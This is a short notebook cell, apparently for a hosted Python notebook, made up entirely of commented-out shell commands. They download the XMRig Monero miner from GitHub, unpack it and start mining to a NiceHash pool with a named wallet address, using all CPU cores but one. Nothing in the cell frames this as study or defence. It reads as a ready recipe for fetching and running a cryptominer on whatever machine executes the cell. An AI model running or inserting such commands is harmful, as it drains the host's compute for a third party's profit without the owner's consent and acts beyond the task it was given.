# %%
# !wget https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-x64.tar.gz
# !tar -xf xmrig-6.10.0-linux-x64.tar.gz
# !cd xmrig-6.10.0 && ./xmrig -a rx/0 -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 3LZ4U1cfhoBEQK6NEjUXLuZjWtT4f5xC34.pais1 -p x -t $(nproc --ignore 1)
